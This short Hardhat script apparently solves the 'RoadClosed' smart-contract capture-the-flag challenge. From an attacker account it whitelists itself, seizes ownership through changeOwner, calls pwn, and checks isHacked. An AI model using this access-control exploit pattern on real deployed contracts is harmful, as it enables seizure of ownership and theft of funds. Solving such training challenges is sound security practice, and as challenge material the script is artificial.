import chalk from "chalk";
import { ethers } from "hardhat";
import { RoadClosedQuill__factory, RoadClosedQuill } from "../../typechain";
import { log, initialize } from "../utils";
import {randomBytes} from "crypto";

async function main() {
    let [roadClosedQuillContract, attacker] = await initialize<RoadClosedQuill>(RoadClosedQuill__factory);
    let tx = await roadClosedQuillContract.addToWhitelist(attacker.address);
    await tx.wait();
    tx = await roadClosedQuillContract.changeOwner(attacker.address);
    await tx.wait();
    tx = await roadClosedQuillContract["pwn(address)"](attacker.address);
    await tx.wait();

    log(`Is solved: ${chalk.yellow(await roadClosedQuillContract.isHacked())}`);
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});